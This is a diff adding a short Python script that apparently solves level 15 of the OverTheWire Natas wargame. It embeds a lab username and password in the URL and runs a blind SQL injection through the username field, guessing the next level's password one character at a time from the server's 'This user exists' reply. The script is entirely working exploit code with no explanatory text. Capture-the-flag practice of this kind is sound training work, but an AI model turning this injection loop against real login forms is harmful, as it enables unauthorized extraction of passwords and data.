@@ -1,0 +1,23 @@
+import requests
+
+URL = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'
+ss = 'acehijmnpqtwBEHINORW03569'
+s = requests.Session()
+a = ''
+
+for i in range(0,32):
+   for ch in ss:
+      data = {'username':'natas16" and password LIKE BINARY "'+a+ch+'%" -- '}
+      r = s.post(URL, data=data)
+      if 'This user exists' in r.text:
+         #print(ch)
+         a = a+ch
+         #print(a)
+print(a)
+
+
+#resp = s.post(URL)# maybe unUsed
+
+
+
+#print(r.text)
